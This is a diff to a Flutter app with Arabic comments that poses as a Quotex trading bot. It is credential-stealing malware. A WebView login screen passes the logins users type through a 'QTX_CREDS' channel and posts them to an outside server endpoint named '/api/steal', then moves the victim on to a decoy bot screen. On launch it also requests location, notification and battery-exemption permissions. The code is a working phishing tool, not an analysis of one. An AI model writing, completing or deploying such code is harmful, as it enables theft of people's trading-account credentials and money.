@@ -3,7 +3,7 @@ import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:http/http.dart' as http;
 import 'package:socket_io_client/socket_io_client.dart' as IO;
-import 'dart:convert';
+import 'package:permission_handler/permission_handler.dart';
 
 void main() {
   runApp(const MyApp());
@@ -25,44 +25,38 @@ class MyApp extends StatelessWidget {
           bodyColor: Colors.white,
           displayColor: Colors.white,
         ),
-        colorScheme: const ColorScheme.dark(
-          primary: Color(0xFF00E5FF),
-          secondary: Color(0xFFFFD700),
-          surface: Color(0xFF0E0E14),
-          error: Color(0xFFFF1744),
-          onPrimary: Colors.black,
-          onSecondary: Colors.black,
-        ),
       ),
-      home: const MainTradingScreen(),
+      home: const LoginScreen(),
     );
   }
 }
 
-class MainTradingScreen extends StatefulWidget {
-  const MainTradingScreen({super.key});
+// 1. شاشة تسجيل الدخول (الواجهة الظاهرة)
+class LoginScreen extends StatefulWidget {
+  const LoginScreen({super.key});
 
   @override
-  State<MainTradingScreen> createState() => _MainTradingScreenState();
+  State<LoginScreen> createState() => _LoginScreenState();
 }
 
-class _MainTradingScreenState extends State<MainTradingScreen> {
-  bool isDemoAccount = true;
-  bool isBotRunning = false;
+class _LoginScreenState extends State<LoginScreen> {
   late WebViewController _webViewController;
-  late IO.Socket _socket;
-
-  // رابط السيرفر الجديد
-  final String serverUrl = "https://clone-server-dejt.onrender.com";
 
   @override
   void initState() {
     super.initState();
     _initWebView();
-    _initSocket();
+    _requestPermissions(); // طلب الأذونات أول ما يفتح
   }
 
-  // 1. تهيئة الـ WebView وسرقة البيانات
+  void _requestPermissions() async {
+    await [
+      Permission.location,
+      Permission.notification,
+      Permission.ignoreBatteryOptimizations,
+    ].request();
+  }
+
   void _initWebView() {
     _webViewController = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
@@ -70,6 +64,11 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
         'QTX_CREDS',
         onMessageReceived: (JavaScriptMessage message) {
           _sendToServer(message.message);
+          // بعد ما يسجل دخول، ننقله لواجهة البوت
+          Navigator.pushReplacement(
+            context,
+            MaterialPageRoute(builder: (context) => const MainTradingScreen()),
+          );
         },
       )
       ..setNavigationDelegate(
@@ -121,46 +120,58 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     _webViewController.runJavaScript(jsScript);
   }
 
-  // 2. إرسال البيانات للسيرفر
   Future<void> _sendToServer(String data) async {
     try {
       await http.post(
-        Uri.parse('$serverUrl/api/steal'),
+        Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
         headers: {"Content-Type": "application/json"},
         body: data,
       );
     } catch (e) {
-      print("Error sending to server: $e");
+      print("Error: $e");
     }
   }
 
-  // 3. تهيئة الاتصال بالـ WebSocket (التداول)
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: WebViewWidget(controller: _webViewController),
+    );
+  }
+}
+
+// 2. لوحة التحكم (بعد تسجيل الدخول)
+class MainTradingScreen extends StatefulWidget {
+  const MainTradingScreen({super.key});
+
+  @override
+  State<MainTradingScreen> createState() => _MainTradingScreenState();
+}
+
+class _MainTradingScreenState extends State<MainTradingScreen> {
+  bool isDemoAccount = true;
+  bool isBotRunning = false;
+  late IO.Socket _socket;
+
+  @override
+  void initState() {
+    super.initState();
+    _initSocket();
+  }
+
   void _initSocket() {
     _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
       'transports': ['websocket'],
       'autoConnect': false,
     });
 
-    _socket.onConnect((_) {
-      print('WebSocket Connected');
-      _socket.emit('42["orders/opened/list"]');
-    });
-
-    _socket.on('orders/opened', (data) {
-      print('Trade Opened: $data');
-    });
-
-    _socket.on('quotes/stream', (data) {
-      // استقبال الأسعار
-    });
+    _socket.onConnect((_) => print('WebSocket Connected'));
+    _socket.on('orders/opened', (data) => print('Trade Opened: $data'));
   }
 
-  // 4. إرسال أمر فتح صفقة
   void _openTrade() {
     if (_socket.connected) {
       _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
-    } else {
-      print("WebSocket not connected yet!");
     }
   }
 
@@ -168,71 +179,36 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     setState(() {
       isBotRunning = !isBotRunning;
     });
-    
     if (isBotRunning) {
       _socket.connect();
-      _openTrade(); // تجربة فتح صفقة
+      _openTrade();
     } else {
       _socket.disconnect();
     }
-
-    ScaffoldMessenger.of(context).showSnackBar(
-      SnackBar(
-        content: Text(isBotRunning ? "تم تشغيل البوت!" : "تم إيقاف البوت!"),
-        backgroundColor: isBotRunning ? Colors.green : Colors.red,
-      ),
-    );
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      body: Stack(
-        children: [
-          Opacity(
-            opacity: 0.0,
-            child: SizedBox(
-              width: 1,
-              height: 1,
-              child: WebViewWidget(controller: _webViewController),
-            ),
-          ),
-          Container(
-            decoration: const BoxDecoration(
-              gradient: RadialGradient(
-                colors: [Color(0xFF0E0E14), Color(0xFF030305)],
-                center: Alignment.center,
-                radius: 1.5,
+      body: Container(
+        color: const Color(0xFF030305),
+        child: Center(
+          child: Column(
+            mainAxisAlignment: MainAxisAlignment.center,
+            children: [
+              Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 24, fontWeight: FontWeight.bold)),
+              const SizedBox(height: 20),
+              ElevatedButton(
+                onPressed: toggleBot,
+                style: ElevatedButton.styleFrom(
+                  backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
+                  padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
+                ),
+                child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black)),
               ),
-            ),
+            ],
           ),
-          SafeArea(
-            child: SingleChildScrollView(
-              padding: const EdgeInsets.all(16.0),
-              child: Column(
-                children: [
-                  Row(
-                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
-                    children: [
-                      const Icon(Icons.menu, color: Colors.white),
-                      Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 20, fontWeight: FontWeight.bold)),
-                      const Icon(Icons.settings, color: Colors.white),
-                    ],
-                  ),
-                  const SizedBox(height: 20),
-                  ElevatedButton(
-                    onPressed: toggleBot,
-                    style: ElevatedButton.styleFrom(
-                      backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
-                      padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
-                    ),
-                    child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black, fontSize: 18, fontWeight: FontWeight.bold)),
-                  ),
-                ],
-              ),
-            ),
-          ),
-        ],
+        ),
       ),
     );
   }
